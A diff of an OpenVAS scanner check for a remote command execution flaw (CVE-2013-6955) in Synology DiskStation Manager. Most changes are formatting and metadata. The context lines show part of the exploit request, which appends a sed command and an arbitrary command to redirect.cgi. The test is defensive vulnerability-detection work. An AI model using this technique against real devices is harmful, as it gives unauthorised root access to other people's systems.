@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_synology_dsm_64516.nasl 6756 2017-07-18 13:31:14Z cfischer $
+# $Id: gb_synology_dsm_64516.nasl 10904 2018-08-10 14:24:40Z mmartin $
 #
 # Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability
 #
@@ -34,13 +34,13 @@ if (description)
  script_cve_id("CVE-2013-6955");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 6756 $");
+ script_version("$Revision: 10904 $");
 
  script_name("Synology DiskStation Manager 'imageSelector.cgi' Remote Command Execution Vulnerability");
 
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64516");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
+
+ script_tag(name:"last_modification", value:"$Date: 2018-08-10 16:24:40 +0200 (Fri, 10 Aug 2018) $");
  script_tag(name:"creation_date", value:"2014-01-07 14:57:33 +0100 (Tue, 07 Jan 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
@@ -49,17 +49,18 @@ if (description)
  script_require_ports("Services/www", 80, 5000, 5001);
  script_mandatory_keys("synology_dsm/installed");
 
- script_tag(name : "impact" , value : "An attacker can exploit this issue to execute arbitrary commands with
+ script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary commands with
  root privileges.");
- script_tag(name : "vuldetect" , value : "This script tries to execute the 'id' command on the remote host using specially crafted requests.");
- script_tag(name : "insight" , value : "Synology DiskStation Manager (DSM) contains a flaw in the
+ script_tag(name:"vuldetect", value:"This script tries to execute the 'id' command on the remote host using specially crafted requests.");
+ script_tag(name:"insight", value:"Synology DiskStation Manager (DSM) contains a flaw in the
  SliceUpload functionality provided by /webman/imageSelector.cgi. With a
  specially crafted request, a remote attacker can append data to files, allowing
  for the execution of arbitrary commands.");
- script_tag(name : "solution" , value : "Updates are available.");
- script_tag(name : "summary" , value : "Synology DiskStation Manager is prone to a remote command-execution
+ script_tag(name:"solution", value:"Updates are available.");
+ script_tag(name:"solution_type", value:"VendorFix");
+ script_tag(name:"summary", value:"Synology DiskStation Manager is prone to a remote command-execution
  vulnerability.");
- script_tag(name : "affected" , value : "Synology DiskStation Manager 4.x are vulnerable; other versions may
+ script_tag(name:"affected", value:"Synology DiskStation Manager 4.x are vulnerable; other versions may
  also be affected.");
 
  script_tag(name:"qod_type", value:"remote_app");
@@ -91,7 +92,7 @@ function send_post_request ( cmd )
         'logo\r\n' +
         '  --' + boundary + '\r\n' +
         'Content-Disposition: form-data; name="openvas"; filename="openvas"\r\n' +
-        'Content-Type: application/octet-stream\r\n' + 
+        'Content-Type: application/octet-stream\r\n' +
         '\r\n' +
         "sed -i -e '/sed -i -e/,$d' /usr/syno/synoman/redirect.cgi" + '\n' +
         cmd + '\r\n' +
@@ -110,7 +111,7 @@ function send_post_request ( cmd )
         data;
 
   buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
-      
+
   if ( "error_noprivilege" >< buf ) return TRUE;
 }
 
